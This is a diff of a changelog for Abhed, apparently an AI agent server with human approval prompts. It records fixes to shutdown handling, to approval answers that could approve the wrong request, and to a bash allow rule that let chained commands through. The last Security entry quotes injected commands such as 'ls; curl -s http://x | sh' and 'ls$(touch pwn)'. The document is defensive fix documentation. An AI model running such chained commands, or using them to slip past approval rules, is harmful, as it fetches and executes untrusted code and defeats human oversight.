@@ -18,6 +18,15 @@ All notable changes to Abhed are recorded here. The format follows
 - Only a `bash` call that is just `cd <folder>` now carries its directory to
   the next call, for the agent and the line-by-line terminal. A chain such as
   `mkdir x && cd x` no longer does: send the `cd` as a call of its own.
+- A turn waiting for approval when the server shuts down now ends with reason
+  `shutdown`, not `user_interrupt`; a filter on `user_interrupt` no longer
+  counts server stops.
+- A client of `POST /v1/sessions/{id}/approve` should send the `request_id` of
+  the `action.requested` event it answers. An answer sent with nothing pending
+  now gets `409` instead of `204` (it was held and approved the next request);
+  an answer recorded after its turn stopped waiting gets `200`
+  `{"recorded":true,"applied":false}`; a bound answer on a node not running the
+  session gets `421` with `Abhed-Session-Node`.
 
 ### Added
 
@@ -75,9 +84,77 @@ All notable changes to Abhed are recorded here. The format follows
   the chat rail. The header shows the health light, and below 400 pixels
   leaves the Admin link to the landing page. The workbench keeps its Switch
   link at every width.
+- Stopping the server (SIGTERM) while a turn was running, most often while it
+  waited for approval, could exit before the turn recorded `session.ended`,
+  so the session listed as running forever. The server now waits, up to five
+  seconds, for cancelled turns to record their end before it returns, and a
+  turn waiting for approval no longer waits on a slow approval write once
+  cancelled. Such a turn ends with reason `shutdown`, as other cancelled
+  turns do, where it used to record `user_interrupt`; a turn stopped before
+  the model's first reply is still recorded as `error`. A turn started by a
+  message to an open session, which is every workbench turn, is now ended
+  on shutdown too; before, the server waited on it and exited with no end
+  recorded. While the server is stopping, a message to a session gets 503
+  with `Retry-After`, whether it would start a turn, steer a running one or
+  send it now, and a Send now no longer stops a turn the drain is letting
+  finish.
+- In a workbench session whose event stream was already open, for example
+  after opening a terminal, the first message that needed approval stayed at
+  "Thinking" and never showed Allow or Deny, so the run waited for an answer
+  no one could give. The prompt now shows on the first turn, after Send now,
+  and when the page opens on a session that is waiting for approval.
 
 ### Security
 
+- An approval could answer a different request from the one it was shown
+  for. `POST /v1/sessions/{id}/approve` named no call, so after Send now a
+  click on the interrupted run's prompt approved the new run's call; and an
+  answer sent while nothing was pending was held and approved the next
+  request unasked. The endpoint now takes an optional `request_id`, the `id`
+  of the `action.requested` event being answered (a model's `call_id` is not
+  used, because models repeat it across turns):
+  - On the node running the session, the reply says what became of the
+    answer: 204 the waiting turn took it; 200
+    `{"recorded":true,"applied":false}` it was recorded on the store but the
+    turn stopped waiting first (it was interrupted or timed out), so nothing
+    ran on it; 409 it was refused; 429 too many answers are waiting, retry;
+    400 its scope was not the one offered;
+    503 the request's row was not written within 30 seconds.
+  - An answer naming another request, or one that has ended, is refused
+    with 409 "that approval is no longer pending", and is neither taken nor
+    recorded. An answer that arrives with an interrupt is refused the same
+    way, or reported as recorded but not applied if it reached the store,
+    unless the turn took it first.
+  - An answer with nothing pending is refused with 409 "no approval is
+    pending for this session" and is no longer held. An answer naming a
+    request not yet published waits up to two seconds for the turn to
+    publish it, then gets that 409. Once published, it waits up to 30 seconds
+    more for the request's row to be written, then gets 503. At most eight
+    answers wait per session; more get 429 "too many answers are waiting
+    for this session" with `Retry-After`, and the workbench and console keep
+    the prompt and say "Busy, try again".
+  - An answer's `scope` ("always allow") must be empty or the scope the
+    request offered; any other is refused with 400, so a client cannot
+    widen what is remembered for the session.
+  - Two answers at once, with or without a store: one is taken and the other
+    refused with 409 "this approval was already answered", so a Deny is
+    never acknowledged while the turn runs the Allow. With a store, the
+    answer is recorded on that request's own row, not the session's newest,
+    and the first recorded decides.
+  - On a node that is not running the session, an answer naming a request is
+    not recorded, since the stored row cannot be checked against it; the
+    reply is the usual 421 with `Abhed-Session-Node`, so it can be sent to
+    the node that is, or 404 when routing is off. Storing the request id on
+    the approval row, so any node can check it, is a follow-up.
+  - An answer without `request_id` still answers the pending request, as
+    before, on any node; on another node its 204 means it was recorded on
+    the store for the running node to read. Clients should send
+    `request_id`, as the workbench and the console now do.
+
+  The workbench and the console also settle a prompt the server refuses an
+  answer for (409, or 421 with a note that it must be answered on the server
+  running the session), and the workbench settles a run's open prompts when
+  the run ends, so they can no longer be clicked.
 - A `bash` allow rule no longer approves a chained command. With
   `bash(ls*)`, `ls; curl -s http://x | sh`, `ls && python3 -c ...`,
   `ls$(touch pwn)` and `ls > important.txt` were approved without asking. An
